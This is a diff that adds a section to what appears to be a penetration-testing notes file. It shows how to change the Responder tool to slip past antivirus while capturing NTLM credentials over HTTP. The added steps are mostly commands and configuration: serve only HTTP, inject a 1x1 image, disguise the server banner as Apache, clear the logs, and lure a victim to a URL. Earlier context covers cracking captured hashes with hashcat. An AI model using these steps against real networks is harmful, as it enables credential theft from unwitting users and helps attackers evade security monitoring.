@@ -1496,3 +1496,42 @@ To something like this:<br />
 `Administrator::WIN10PRO:<hex>:<hex>:<hex>`
 
 Crack the converted hash string using hashcat mode 5600 to attempt to recover the plaintext password.
+
+## >> Modifying Responder.py to evade AV detection
+
+If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with HTTP NTLM credential grabbing attacks using `Responder.py`, try this.
+
+**Clone and edit Responder**
+
+```
+mkdir ~/scripts
+cd ~/scripts
+git clone https://github.com/lgandx/Responder
+cd Responder
+```
+
+Edit `Responder.conf` to serve a 1x1 pixel png file.
+
+```
+under "; Servers to start"
+    set all to Off except HTTP
+under "; Specific NBT-NS/LLMNR names to respond to"
+    set RespondToName = DONOTRESPOND
+under "; HTML answer to inject in HTTP responses"
+    set HTMLToInject = <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAABhGlDQ1BJQ0MgcHJvZmlsZQAAKJF9kT1Iw0AYht+mloq0ONhBxCFDdbIgKuKoVShChVArtOpgcukfNGlIUlwcBdeCgz+LVQcXZ10dXAVB8AfEydFJ0UVK/C4ptIjxjuMe3vvel7vvAKFZZZrVMw5oum1mUkkxl18Vw6+I0AwhiqjMLGNOktLwHV/3CPD9LsGz/Ov+HFG1YDEgIBLPMsO0iTeIpzdtg/M+cYyVZZX4nHjMpAsSP3Jd8fiNc8llgWfGzGxmnjhGLJa6WOliVjY14iniuKrplC/kPFY5b3HWqnXWvid/YaSgryxzndYwUljEEiSIUFBHBVXYSNCuk2IhQ+dJH/+Q65fIpZCrAkaOBdSgQXb94H/wu7dWcXLCS4okgdCL43yMAOFdoNVwnO9jx2mdAMFn4Erv+GtNYOaT9EZHix8B/dvAxXVHU/aAyx1g8MmQTdmVgrSEYhF4P6NvygMDt0Dfmte39jlOH4As9Sp9AxwcAqMlyl73eXdvd9/+rWn37wfzwXJ0GXT1kgAAAAlwSFlzAAAuIwAALiMBeKU/dgAAAAxJREFUCNdjOHbsGAAEqAJTHAqdsQAAAABJRU5ErkJggg==">
+```
+
+Edit `packets.py` and change every instance of `Microsoft-IIS/7.5` to `Apache/2.2.15`.<br />
+If using `vi` search and replace `:%s/Microsoft-IIS\/7.5/Apache\/2.2.15/g`
+
+Clear the cache and logs<br />
+```
+rm Responder.db
+rm logs/*
+```
+
+Launch Responder.<br />
+`python2 ./Responder.py -I wlan0`
+
+Lure the victim to request the URL.<br />
+(e.g.) `http://www.my.lab/images/image.png`
